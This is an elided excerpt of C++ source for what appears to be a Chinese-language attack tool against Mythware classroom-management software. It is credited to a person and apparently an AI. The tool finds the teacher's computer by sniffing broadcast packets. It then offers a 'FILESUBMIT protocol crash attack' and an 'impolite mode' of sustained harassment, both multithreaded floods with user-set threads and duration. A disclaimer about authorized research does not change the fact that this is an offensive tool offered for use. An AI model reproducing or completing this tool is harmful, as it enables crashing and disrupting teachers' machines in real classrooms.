...
// 带颜色的输出宏
#define INFO(msg)     std::cout << COLOR_BLUE << "[*] " << msg << COLOR_RESET << std::endl
#define SUCCESS(msg)  std::cout << COLOR_GREEN << "[+] " << msg << COLOR_RESET << std::endl
#define WARNING(msg)  std::cout << COLOR_YELLOW << "[!] " << msg << COLOR_RESET << std::endl
#define ERROR(msg)    std::cout << COLOR_RED << "[-] " << msg << COLOR_RESET << std::endl
#define IMPORTANT(msg) std::cout << COLOR_MAGENTA << "[>] " << msg << COLOR_RESET << std::endl
#define DEBUG(msg)    std::cout << COLOR_CYAN << "[D] " << msg << COLOR_RESET << std::endl
...
private:
    ...
    void impoliteModeThread(int threadId, int durationSeconds) {
        ...
        // 举手包数据
        unsigned char raiseHandPacket[76] = {
...
public:
    ...
    void startAttack(int attackType, int threads, int durationSeconds) {
        ...
        std::thread statsThread([this, durationSeconds, attackType]() {
            ...
            while (attacking) {
                ...
                if (attackType == 2) {
                    // 不客气模式专用统计
                    std::cout << COLOR_CYAN << "\r[*] 不客气模式 已发送: " << packetsSent << " 包, "
                        << bytesSent << " 字节 | 时间: " << elapsed << "/" << durationSeconds << "秒" << COLOR_RESET << std::flush;
                }
                else {
                    // FILESUBMIT模式统计
                    std::cout << COLOR_CYAN << "\r[*] FILESUBMIT攻击 发送: " << packetsSent << " 包, "
                        << bytesSent << " 字节 | 时间: " << elapsed << "/" << durationSeconds << "秒" << COLOR_RESET << std::flush;
                }
    ...
    void showMenu() {
        std::cout << COLOR_MAGENTA << "\n========== 极域电子教室测试工具 ==========" << COLOR_RESET << std::endl;
        std::cout << COLOR_CYAN << "目标教师机: " << targetIP << COLOR_RESET << std::endl;
        std::cout << COLOR_MAGENTA << "=========================================" << COLOR_RESET << std::endl;
        std::cout << COLOR_WHITE << "[1] FILESUBMIT协议崩溃攻击" << COLOR_RESET << std::endl;
        std::cout << COLOR_WHITE << "[2] 不客气模式 (持续骚扰)" << COLOR_RESET << std::endl;
        std::cout << COLOR_WHITE << "[3] 重新发现教师机" << COLOR_RESET << std::endl;
        std::cout << COLOR_WHITE << "[0] 退出程序" << COLOR_RESET << std::endl;
        std::cout << COLOR_MAGENTA << "=========================================" << COLOR_RESET << std::endl;
        std::cout << COLOR_CYAN << "请选择: " << COLOR_RESET;
    }
};
...
private:
    ...
    void listLocalIPs() {
        ...
        for (int i = 0; host->h_addr_list[i] != nullptr; i++) {
            ...
            std::cout << COLOR_WHITE << "  - " << inet_ntoa(addr) << COLOR_RESET << std::endl;
        }
    }
...
public:
    ...
    std::string discoverTeacherIP(int timeoutSeconds = 10) {
        std::cout << COLOR_MAGENTA << "=== 极域电子教室教师机发现工具 ===" << COLOR_RESET << std::endl;
        std::cout << COLOR_CYAN << "By: Lxrui & KimiAI" << COLOR_RESET << std::endl << std::endl;
        listLocalIPs();
        ...
        while (true) {
            ...
            if (recvLen > 0) {
                packetCount++;
                std::cout << COLOR_CYAN << "\r[*] 收到数据包 " << packetCount << " (长度: " << recvLen << " 字节)" << COLOR_RESET << std::flush;
                ...
                if (recvLen >= 4) {
                    ...
                    if (packetType == "OONC" && recvLen >= 44) {
                        ...
                        SUCCESS("发现教师机 (OONC包)!");
                        std::cout << COLOR_MAGENTA << "====================================" << COLOR_RESET << std::endl;
                        std::cout << COLOR_CYAN << "教师机IP地址: " << teacherIP << COLOR_RESET << std::endl;
                        std::cout << COLOR_CYAN << "通信端口: " << ntohs(fromAddr.sin_port) << COLOR_RESET << std::endl;
                        std::cout << COLOR_CYAN << "数据包大小: " << recvLen << " 字节" << COLOR_RESET << std::endl;
                        std::cout << COLOR_CYAN << "包类型: OONC" << COLOR_RESET << std::endl;
                        std::cout << COLOR_MAGENTA << "====================================" << COLOR_RESET << std::endl;
                        ...
                        if (!teacherIP.empty()) {
                            ...
                            std::cout << COLOR_CYAN << "通信端口: " << ntohs(fromAddr.sin_port) << COLOR_RESET << std::endl;
                            std::cout << COLOR_CYAN << "数据包大小: " << recvLen << " 字节" << COLOR_RESET << std::endl;
                            std::cout << COLOR_CYAN << "包类型: CANC" << COLOR_RESET << std::endl;
                            std::cout << COLOR_MAGENTA << "====================================" << COLOR_RESET << std::endl;
                        ...
                        std::cout << COLOR_CYAN << "\r[*] 未知包类型: " << packetType << " (长度: " << recvLen << ")" << COLOR_RESET << std::flush;
                    }
                }
            }
            else if (recvLen == 0) {
...
void showWarning() {
    ...
    std::cout << COLOR_RED << "警告：本程序仅供网络安全研究和教育用途！" << COLOR_RESET << std::endl;
    std::cout << COLOR_YELLOW << "请务必在授权环境下测试，非法使用可能违反法律！" << COLOR_RESET << std::endl;
    std::cout << COLOR_YELLOW << "=====================================================================" << COLOR_RESET << std::endl;
    std::cout << COLOR_CYAN << "\n按回车键继续..." << COLOR_RESET << std::endl;
    std::cin.get();
}
...
int main() {
    ...
    while (true) {
        ...
        if (attacker != nullptr) {
            ...
            case 1:
            case 2: {
                std::cout << COLOR_CYAN << "\n[*] 攻击配置:" << COLOR_RESET << std::endl;
                std::cout << COLOR_WHITE << "线程数(建议10-100): " << COLOR_RESET;
                int threads;
                std::cin >> threads;
                std::cout << COLOR_WHITE << "持续时间(秒): " << COLOR_RESET;
                int duration;
                std::cin >> duration;
                std::cin.ignore();
